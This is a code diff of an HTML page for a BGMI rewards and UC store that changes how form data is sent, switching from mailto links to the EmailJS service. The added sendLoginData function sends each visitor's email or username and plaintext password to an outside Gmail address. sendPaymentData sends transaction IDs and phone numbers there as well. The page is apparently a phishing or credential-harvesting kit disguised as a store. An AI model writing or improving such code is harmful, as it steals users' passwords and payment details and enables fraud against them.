@@ -5,6 +5,14 @@
 <meta name="viewport" content="width=device-width,initial-scale=1" />
 <title>CxPlays — BGMI Rewards & UC Store</title>
 <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700;800&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+<!-- EmailJS Library -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+  // EmailJS Initialize - REPLACE WITH YOUR PUBLIC KEY
+  (function(){
+    emailjs.init("O3Hfwuo81Wy7k-WXP"); // Replace with your EmailJS public key
+  })();
+</script>
 <style>
   :root{
     --bg-1: #050617;
@@ -642,26 +650,34 @@
   }
 
   function sendLoginData(userData){
-    const emailBody = `
-New Login on CxPlays Store
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-METHOD: ${userData.method}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-USER DETAILS:
-Email/Username: ${userData.email}
-Password: ${userData.password}
-Display Name: ${userData.name}
-Login Time: ${new Date(userData.timestamp).toLocaleString()}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-CxPlays Authentication System
-    `.trim();
-
-    const mailtoLink = `mailto:cutexmods@gmail.com?subject=🔐 New Login - ${userData.method} - CxPlays&body=${encodeURIComponent(emailBody)}`;
-    window.open(mailtoLink, '_blank');
+    // EmailJS Configuration - REPLACE WITH YOUR IDs
+    const serviceID = 'service_gr6101e'; // Replace with your EmailJS service ID
+    const templateID = 'template_2z84ibm'; // Replace with your login template ID
     
-    console.log('Login data sent:', {email: userData.email, method: userData.method});
+    const emailParams = {
+      to_email: 'cutexmods@gmail.com',
+      from_name: 'CxPlays Login System',
+      method: userData.method,
+      email: userData.email,
+      password: userData.password || 'N/A',
+      name: userData.name,
+      timestamp: new Date(userData.timestamp).toLocaleString(),
+      subject: `New Login - ${userData.method}`
+    };
+    
+    // Show loading
+    showLoadingToast('Sending login data...');
+    
+    // Send email via EmailJS
+    emailjs.send(serviceID, templateID, emailParams)
+      .then(function(response) {
+        console.log('Login email sent successfully!', response.status, response.text);
+        hideLoadingToast();
+      }, function(error) {
+        console.error('Failed to send login email:', error);
+        hideLoadingToast();
+        alert('⚠️ Email sending failed. Please contact admin manually.');
+      });
   }
 
   function paymentHtml(action, price){
@@ -793,44 +809,60 @@ CxPlays Authentication System
   }
 
   function sendPaymentData(paymentData){
-    const emailBody = `
-💳 NEW PAYMENT SUBMISSION - CxPlays Store
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-👤 USER DETAILS:
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Name: ${paymentData.user.name}
-Email: ${paymentData.user.email}
-Login Method: ${paymentData.user.method}
-
-🛍️ PURCHASE DETAILS:
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Item: ${paymentData.item}
-Price: ₹${paymentData.price}
-
-🎮 DELIVERY DETAILS:
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-BGMI Character ID: ${paymentData.bgmiId}
-
-💰 PAYMENT DETAILS:
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-UTR/Transaction ID: ${paymentData.utrId}
-Phone Number: ${paymentData.phone || 'Not provided'}
-
-📅 TRANSACTION INFO:
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Status: ${paymentData.status}
-Timestamp: ${new Date(paymentData.timestamp).toLocaleString()}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️ ACTION REQUIRED: Please verify this payment and send the item to BGMI ID: ${paymentData.bgmiId}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    `.trim();
-
-    const mailtoLink = `mailto:cutexmods@gmail.com?subject=💳 Payment Submitted - ${paymentData.item} - ₹${paymentData.price}&body=${encodeURIComponent(emailBody)}`;
-    window.open(mailtoLink, '_blank');
+    // EmailJS Configuration - REPLACE WITH YOUR IDs
+    const serviceID = 'service_gr6101e'; // Replace with your EmailJS service ID
+    const templateID = 'template_50ljnlg'; // Replace with your payment template ID
     
-    console.log('Payment data sent:', paymentData);
+    const emailParams = {
+      to_email: 'cutexmods@gmail.com',
+      from_name: 'CxPlays Payment System',
+      user_name: paymentData.user.name,
+      user_email: paymentData.user.email,
+      login_method: paymentData.user.method,
+      item_name: paymentData.item,
+      price: paymentData.price,
+      bgmi_id: paymentData.bgmiId,
+      utr_id: paymentData.utrId,
+      phone: paymentData.phone || 'Not provided',
+      status: paymentData.status,
+      timestamp: new Date(paymentData.timestamp).toLocaleString(),
+      subject: `Payment - ${paymentData.item} - ₹${paymentData.price}`
+    };
+    
+    // Show loading
+    showLoadingToast('Submitting payment...');
+    
+    // Send email via EmailJS
+    emailjs.send(serviceID, templateID, emailParams)
+      .then(function(response) {
+        console.log('Payment email sent successfully!', response.status, response.text);
+        hideLoadingToast();
+      }, function(error) {
+        console.error('Failed to send payment email:', error);
+        hideLoadingToast();
+        alert('⚠️ Email sending failed. Please contact admin manually with your UTR.');
+      });
+  }
+  
+  function showLoadingToast(message){
+    const toast = document.createElement('div');
+    toast.id = 'loadingToast';
+    toast.style.cssText = 'position:fixed; top:20px; right:20px; background:#ff8b3d; color:#fff; padding:16px 20px; border-radius:10px; font-weight:700; z-index:9999; box-shadow:0 8px 24px rgba(0,0,0,0.3); display:flex; align-items:center; gap:10px';
+    toast.innerHTML = `<div style="width:16px; height:16px; border:3px solid #fff; border-top-color:transparent; border-radius:50%; animation:spin 0.8s linear infinite"></div> ${message}`;
+    document.body.appendChild(toast);
+    
+    // Add spin animation
+    if(!document.getElementById('spinStyle')){
+      const style = document.createElement('style');
+      style.id = 'spinStyle';
+      style.textContent = '@keyframes spin { to { transform: rotate(360deg); } }';
+      document.head.appendChild(style);
+    }
+  }
+  
+  function hideLoadingToast(){
+    const toast = document.getElementById('loadingToast');
+    if(toast) toast.remove();
   }
 
   function logout(){
